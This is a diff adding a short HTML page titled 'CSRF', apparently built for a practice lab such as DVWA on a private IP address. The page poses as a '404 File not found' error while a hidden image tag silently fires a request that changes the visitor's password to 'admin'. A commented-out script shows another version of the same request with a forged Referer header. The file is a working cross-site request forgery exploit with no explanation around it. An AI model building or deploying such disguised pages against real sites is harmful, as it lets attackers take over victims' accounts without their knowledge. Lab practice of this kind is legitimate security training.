@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>CSRF</title>
+    <script>
+        // window.onload=function() {
+        //     const url="http://192.168.43.191:8091/vulnerabilities/csrf/";
+        //     const param = "password_new=admin&password_conf=admin&Change=Change";
+        //     const obj = new ActiveXObject("Microsoft.XMLDOM");
+        //
+        //     obj.Open(url, false);
+        //     obj.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
+        //     obj.setRequestHeader("Referer", "http://192.168.43.191:8091");
+        //     obj.send(param);
+        //     WScript.Echo(obj.responseText);
+        // }
+    </script>
+</head>
+<body>
+	<img alt style="display:none" src="http://192.168.43.191:8091/vulnerabilities/csrf/?password_new=admin&password_conf=admin&Change=Change">
+    <h1>404</h1>
+    <h1>File not found.</h1>
+</body>
+</html>
